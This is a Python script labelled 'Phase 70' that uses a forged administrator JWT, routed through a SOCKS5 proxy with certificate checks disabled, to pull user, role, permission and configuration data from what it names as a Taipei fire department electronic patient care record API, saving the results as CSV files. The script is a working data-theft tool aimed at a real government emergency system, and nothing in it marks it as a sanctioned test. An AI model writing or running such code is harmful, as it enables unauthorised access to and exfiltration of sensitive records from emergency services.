#!/usr/bin/env python3
"""Phase 70: Export NCDR/EPCR API data to organized CSV files."""
import requests, urllib3, json
urllib3.disable_warnings()

# Proxy
PROXY = {"http": "socks5://202.160.76.154:11085", "https": "socks5://202.160.76.154:11085"}

# Load forged JWT
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/jwt_admin_full.txt', 'r') as f:
    TOKEN = f.read().strip()

BASE = "https://epcr.tpf.gov.tw:4004"
CSV_DIR = '/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/csv_exports'

import os
os.makedirs(CSV_DIR, exist_ok=True)

def api_get(endpoint):
    """GET endpoint with forged JWT token."""
    url = f"{BASE}{endpoint}?token={TOKEN}"
    r = requests.get(url, proxies=PROXY, verify=False, timeout=60,
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    if r.status_code == 200:
        try:
            return r.json()
        except:
            return r.text
    return f"Error: {r.status_code}"

def export_csv(data, filename, key_field=None):
    """Export JSON array to CSV with proper headers."""
    import csv
    if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
        # Get all unique keys
        all_keys = set()
        for item in data:
            all_keys.update(item.keys())
        all_keys = sorted(list(all_keys))
        
        filepath = f"{CSV_DIR}/{filename}.csv"
        with open(filepath, 'w', newline='', encoding='utf-8-sig') as f:
            writer = csv.DictWriter(f, fieldnames=all_keys)
            writer.writeheader()
            for item in data:
                writer.writerow(item)
        
        print(f"  Export: {filename}.csv ({len(data)} rows, {len(all_keys)} cols)")
        print(f"  Columns: {', '.join(all_keys)[:150]}...")
    else:
        # Single object or non-list
        filepath = f"{CSV_DIR}/{filename}.csv"
        with open(filepath, 'w', newline='', encoding='utf-8-sig') as f:
            if isinstance(data, dict):
                writer = csv.writer(f)
                for k, v in data.items():
                    writer.writerow([k, json.dumps(v, ensure_ascii=False)])
                print(f"  Export: {filename}.csv (key-value, {len(data)} rows)")
            else:
                f.write(str(data))
                print(f"  Export: {filename}.csv (text)")

print("=" * 60)
print("EPCR Data CSV Export")
print("=" * 60)

# 1. Export Users
print("\n### Exporting Users...")
users = api_get('/Users')
if isinstance(users, list):
    export_csv(users, 'epcr_users')
    print(f"  Found: {len(users)} users")
    print(f"  Admin accounts: {len([u for u in users if u.get('Role', {}).get('name') == 'ADMIN'])}")
else:
    print(f"  Error: {users}")

# 2. Export Roles
print("\n### Exporting Roles...")
roles = api_get('/Roles')
if isinstance(roles, list):
    export_csv(roles, 'epcr_roles')
    print(f"  Found: {len(roles)} roles")
else:
    print(f"  Error: {roles}")

# 3. Export Permissions
print("\n### Exporting Permissions...")
perms = api_get('/Permissions')
if isinstance(perms, list):
    export_csv(perms, 'epcr_permissions')
    print(f"  Found: {len(perms)} permissions")
else:
    print(f"  Error: {perms}")

# 4. Export Config
print("\n### Exporting Config...")
config = api_get('/config')
if isinstance(config, dict):
    export_csv(config, 'epcr_config')
    print(f"  Found: {len(config)} config keys")
else:
    print(f"  Error: {config}")

# Summary
print(f"\n{'=' * 60}")
print("CSV Export Complete!")
print(f"Location: {CSV_DIR}")
print(f"{'=' * 60}")
print("\nFiles created:")
for f in sorted(os.listdir(CSV_DIR)):
    size = os.path.getsize(f"{CSV_DIR}/{f}")
    print(f"  {f}: {size:,} bytes")
